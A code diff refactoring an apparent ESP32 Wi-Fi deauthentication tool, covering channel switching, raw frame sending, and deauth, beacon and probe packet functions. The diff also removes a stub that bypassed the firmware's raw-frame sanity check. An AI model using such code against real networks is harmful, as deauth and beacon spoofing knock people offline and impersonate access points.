@@ -2,11 +2,6 @@
 
 #include <deauther.hpp>
 
-extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
-{
-    return 0;
-}
-
 const uint8_t probePacket[] = {
     /*  0 - 1  */ 0x40, 0x00,                         // Type: Probe Request
     /*  2 - 3  */ 0x00, 0x00,                         // Duration: 0 microseconds
@@ -116,14 +111,12 @@ Deauther::Deauther()
     kb->prompt_string(ssid, 10);
     kb->prompt_string(password, 10);
 
-    ap_config = {
-        .ap = {
-            .ssid_len = 22,
-            .channel = 1,
-            .authmode = WIFI_AUTH_WPA2_PSK,
-            .ssid_hidden = 0,
-            .max_connection = 4,
-            .beacon_interval = 60000}};
+    ap_config.ap.ssid_len = 22;
+    ap_config.ap.channel = 1;
+    ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
+    ap_config.ap.ssid_hidden = 0;
+    ap_config.ap.max_connection = 4;
+    ap_config.ap.beacon_interval = 60000;
 
     MEMCPY(ap_config.ap.ssid, ssid, 10);
 
@@ -188,6 +181,8 @@ bool Deauther::loop()
     }
 
     gfx->refresh();
+
+    return true;
 }
 
 void Deauther::cleanup()
@@ -196,20 +191,16 @@ void Deauther::cleanup()
     gfx->clearDisplayBuffer();
 }
 
-void Deauther::change_channel(uint8_t channel)
+esp_err_t Deauther::change_channel(const uint8_t channel)
 {
     ap_config.ap.channel = channel;
 
-    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
-
-    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
-    ESP_ERROR_CHECK(esp_wifi_start());
-    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));
+    return esp_wifi_set_config(WIFI_IF_AP, &ap_config);
 }
 
 esp_err_t Deauther::deauth_packet(const mac_address ap, const mac_address station, const mac_address bssid, uint8_t reason, uint8_t channel)
 {
-    esp_err_t res = switch_channel(channel);
+    esp_err_t res = change_channel(channel);
 
     if (res != ESP_OK)
         return res;
@@ -234,7 +225,7 @@ esp_err_t Deauther::deauth_packet(const mac_address ap, const mac_address statio
 // to announce network pressnace, kinda ussless in this case becouse this is used for mostly hacking reasons :P
 esp_err_t Deauther::beacon_packet(const mac_address mac, const char *ssid, uint8_t channel, bool wpa2)
 {
-    esp_err_t res = switch_channel(channel);
+    esp_err_t res = change_channel(channel);
     if (res != ESP_OK)
         return res;
 
@@ -266,7 +257,7 @@ esp_err_t Deauther::beacon_packet(const mac_address mac, const char *ssid, uint8
 
 esp_err_t Deauther::probe_packet(const mac_address mac, const char *ssid, uint8_t channel)
 {
-    esp_err_t res = switch_channel(channel);
+    esp_err_t res = change_channel(channel);
     if (res != ESP_OK)
         return res;
 
@@ -277,7 +268,7 @@ esp_err_t Deauther::probe_packet(const mac_address mac, const char *ssid, uint8_
     return send_raw(buffer, sizeof(probePacket));
 }
 
-esp_err_t send_raw(const uint8_t *packet, int32_t len, bool en_sys_seq)
+esp_err_t Deauther::send_raw(const uint8_t *packet, int32_t len, bool en_sys_seq)
 {
     return esp_wifi_80211_tx(WIFI_IF_AP, packet, len, en_sys_seq);
 }
